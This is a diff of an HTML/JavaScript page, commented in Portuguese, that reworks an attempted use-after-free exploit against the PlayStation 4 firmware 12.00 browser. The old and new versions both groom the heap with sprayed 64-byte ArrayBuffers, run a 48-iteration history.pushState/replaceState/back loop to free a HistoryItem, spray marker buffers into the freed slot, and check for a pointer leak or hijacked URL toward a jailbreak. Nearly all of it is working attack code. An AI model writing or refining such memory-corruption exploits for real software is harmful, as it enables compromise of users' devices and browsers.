@@ -2,18 +2,19 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - Hybrid Exploit (Loop + Neighbors)</title>
+<title>PS4 12.00 - The "Lucky 64" Strategy</title>
 <style>
-    body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; font-size: 14px; }
-    button { padding: 20px; width: 100%; font-weight: bold; font-size: 16px; cursor: pointer; border: 2px solid #0f0; background: #003300; color: #fff; margin-bottom: 10px; }
-    #log { border: 1px solid #333; padding: 10px; height: 450px; overflow-y: scroll; white-space: pre-wrap; background-color: #111; }
+    body { background-color: #101010; color: #00ff00; font-family: monospace; padding: 20px; font-size: 14px; }
+    button { padding: 20px; width: 100%; font-weight: bold; font-size: 16px; cursor: pointer; border: 2px solid #0f0; background: #004400; color: #fff; margin-bottom: 10px; }
+    #log { border: 1px solid #333; padding: 10px; height: 450px; overflow-y: scroll; white-space: pre-wrap; background-color: #000; }
     .success { background-color: #fff; color: #000; font-weight: bold; border: 5px solid #0f0; }
+    .partial { background-color: #ff0; color: #000; font-weight: bold; border: 5px solid #ff0; }
 </style>
 </head>
 <body>
-<h2>PS4 12.00 - Hybrid Attack (Loop 48 + Neighbor Free)</h2>
-<div id="status">Estratégia: Loop 48 -> Blur -> Free Neighbors -> Spray 64b</div>
-<button onclick="runHybridExploit()">INICIAR EXPLOIT HÍBRIDO</button>
+<h2>PS4 12.00 - Replicando o Sucesso "CCCC"</h2>
+<div id="status">Estratégia: Loop 48 + Timeout + ArrayBuffer(64)</div>
+<button onclick="runLucky64()">TENTAR REPRODUZIR SUCESSO</button>
 <div id="log"></div>
 
 <script>
@@ -26,137 +27,113 @@ function log(m) {
 }
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-// =================================================================
-// CONFIGURAÇÃO TÉCNICA
-// =================================================================
-// Alvo: 80 bytes (0x50)
-// ArrayBuffer Payload: 64 bytes (+16 header = 80 total)
+// Configuração baseada no seu sucesso anterior
 const BUFFER_SIZE = 64; 
+const MARKER = 0x41414141; // AAAA
 
-// Frameset Payload: Para ocupar 80 bytes no fastMalloc
-// ssv_len / 8 - 2 => 10 - 2 = 8 vírgulas
-const ROWS_PAYLOAD = ",".repeat(8);
+var keepAlive = [];
+var targetViews = []; // Para checar vazamento de memória
 
-var fsets = [];         // Tapete de preparação
-var sprayed_views = []; // Armazena os buffers finais
-
-async function runHybridExploit() {
+async function runLucky64() {
     logEl.textContent = "";
-    fsets = [];
-    sprayed_views = [];
-    statusEl.textContent = "Rodando Loop de Ativação...";
+    keepAlive = [];
+    targetViews = [];
+    statusEl.textContent = "Preparando...";
 
-    // 1. SETUP DOM
-    const input = document.createElement("input");
-    input.id = "trigger";
-    document.body.appendChild(input);
-    
-    // 2. GROOMING (PREPARAÇÃO)
-    // Criamos um "tapete" de framesets. Quando liberarmos eles no final,
-    // criaremos um buraco gigante no bucket de 80 bytes.
-    log("1. Alocando 2000 Framesets (Grooming)...");
-    for(let i=0; i<2000; i++) {
-        let f = document.createElement("frameset");
-        f.rows = ROWS_PAYLOAD;
-        fsets.push(f);
+    // 1. GROOMING (Igual ao teste do Bucket Shotgun)
+    log("1. Alocando 1500 buffers de 64 bytes...");
+    for(let i=0; i<1500; i++) {
+        let buf = new ArrayBuffer(BUFFER_SIZE);
+        let view = new Uint32Array(buf);
+        view.fill(MARKER);
+        keepAlive.push(buf);
+        // Guardamos algumas views para verificar escrita (LEAK)
+        if(i % 2 === 0) targetViews.push(view);
     }
     
-    // 3. O LOOP DE 48 (GATILHO ESSENCIAL)
-    log("2. Iniciando Loop UAF (48 iterações)...");
+    // Swiss Cheese (Buracos para o UAF cair)
+    log("   -> Criando buracos (1 a cada 4)...");
+    keepAlive = keepAlive.filter((_, i) => i % 4 !== 0);
+
+    // 2. TRIGGER UAF (Loop 48 - O Clássico)
+    log("2. Iniciando Loop UAF...");
     
     let size = 977;
     const STEP = 14461;
 
     for(let i = 0; i < 48; i++) {
-        // Churn de memória para preparar o estado do History
         let frag = "V".repeat(size); 
         history.pushState({}, "", "#" + frag);
         history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
         
+        // Gatilho via Timeout (Como no teste CCCC)
         if(i % 6 === 0) setTimeout(() => history.back(), 0);
         
-        // --- MOMENTO DO ATAQUE (Iteração 47) ---
+        // JANELA CRÍTICA
         if (i === 47) {
-            log(">>> [ITER 47] ARMANDO GATILHO <<<");
+            log(">>> [MOMENTO CRÍTICO] SPRAY <<<");
             
-            // A. Configura o evento BLUR (Disparo preciso)
-            input.onblur = function() {
-                log(">>> [EVENTO] ONBLUR DISPARADO <<<");
-                
-                // B. NEIGHBOR FREEING (A TÉCNICA DO PSFREE)
-                // Liberamos TODOS os framesets para esvaziar o bucket de 80 bytes.
-                // Isso garante que o HistoryItem liberado tenha espaço ao redor
-                // e que o nosso Spray seja aceito imediatamente.
-                log("   -> Liberando vizinhos (Mass Free)...");
-                for(let k=0; k<fsets.length; k++) {
-                    fsets[k].rows = ""; // Libera memória
-                }
-                
-                // C. SPRAY (OCUPAÇÃO)
-                // Usamos 64 bytes (que vira 80 na memória)
-                log("   -> Spraying 1000 ArrayBuffers (64 bytes)...");
-                for(let k=0; k<1000; k++) {
-                    let buf = new ArrayBuffer(BUFFER_SIZE);
-                    let view = new Uint32Array(buf);
-                    
-                    // Marcador 'AAAA' (0x41414141)
-                    view.fill(0x41414141);
-                    
-                    sprayed_views.push(view);
-                }
-            };
+            // Libera o HistoryItem
+            setTimeout(() => history.back(), 0);
             
-            // D. EXECUÇÃO
-            log("3. Focando input e disparando back()...");
-            input.focus();
-            await sleep(100); // Garante foco
-            
-            // O back() causa a perda de foco -> onblur -> free -> spray
-            history.back();
-            
-        } else {
-            // Iterações normais de preparação
-            size += STEP;
-            await sleep(5);
+            // Spray Massivo de 64 bytes
+            // Tentamos ser rápidos para pegar a vaga
+            for(let k=0; k<800; k++) {
+                let buf = new ArrayBuffer(BUFFER_SIZE);
+                let view = new Uint32Array(buf);
+                view.fill(MARKER);
+                keepAlive.push(buf);
+                targetViews.push(view);
+            }
         }
+        
+        size += STEP;
+        await sleep(5);
     }
     
-    // Espera a poeira baixar
-    await sleep(500);
+    await sleep(300);
 
-    // 4. VERIFICAÇÃO (LEAK CHECK)
-    log("4. Verificando sucesso...");
-    let success = false;
+    // 3. ANÁLISE DUPLA (URL + BUFFER)
+    log("3. Analisando resultados...");
     
-    for(let i=0; i < sprayed_views.length; i++) {
-        let view = sprayed_views[i];
-        
-        // Se o valor mudou de 0x41414141, alguém escreveu aqui!
-        if(view[0] !== 0x41414141) {
-            success = true;
-            let val = "0x" + view[0].toString(16).padStart(8,'0');
-            
+    let url = document.URL;
+    let urlChanged = false;
+    let leakFound = false;
+    let leakVal = "";
+
+    // CHECK A: A URL mudou para 'AAAA'? (Sucesso anterior)
+    if (url.indexOf("AAAA") !== -1) {
+        urlChanged = true;
+        log("!!! SINAL POSITIVO: URL CONTÉM 'AAAA' !!!");
+        log("Isso confirma que ocupamos o objeto (FakeObj).");
+    }
+
+    // CHECK B: Algum buffer mudou de valor? (O que precisamos para Jailbreak)
+    for(let i=0; i < targetViews.length; i++) {
+        let view = targetViews[i];
+        if(view[0] !== MARKER) {
+            leakFound = true;
+            leakVal = "0x" + view[0].toString(16).padStart(8,'0');
             log(`!!! LEAK DETECTADO NO BUFFER ${i} !!!`);
-            log(`Valor lido: ${val}`);
-            
-            statusEl.className = "success";
-            statusEl.textContent = `PWNED! LEAK: ${val}`;
-            
-            // Dump extra
-            let d = "";
-            for(let j=0; j<4; j++) d += view[j].toString(16) + " ";
-            log(`Dump: ${d}`);
+            log(`Valor: ${leakVal}`);
             break;
         }
     }
 
-    if(!success) {
-        log("Falha: Buffers intactos.");
-        log("Diagnóstico: Se o loop rodou e o blur disparou, tente ajustar o tamanho para 96 bytes (Buffer 80).");
+    // RESULTADO
+    if (leakFound) {
+        statusEl.className = "success";
+        statusEl.textContent = `PWNED! POINTER LEAK: ${leakVal}`;
+        log("\nCONCLUSÃO: TEMOS UM PONTEIRO! SALVE ESSE VALOR.");
+    } else if (urlChanged) {
+        statusEl.className = "partial";
+        statusEl.textContent = "SUCESSO PARCIAL (FakeObj)";
+        log("\nCONCLUSÃO: Controlamos o objeto, mas o navegador não escreveu nele.");
+        log("Estamos no caminho certo. Tente novamente para conseguir o Leak.");
+    } else {
+        log("Falha: Ainda 'V'. A Race Condition não bateu.");
+        log("Sugestão: Tente clicar no botão novamente. O heap muda a cada tentativa.");
     }
-    
-    // Limpeza
-    input.remove();
 }
 </script>
 </body>
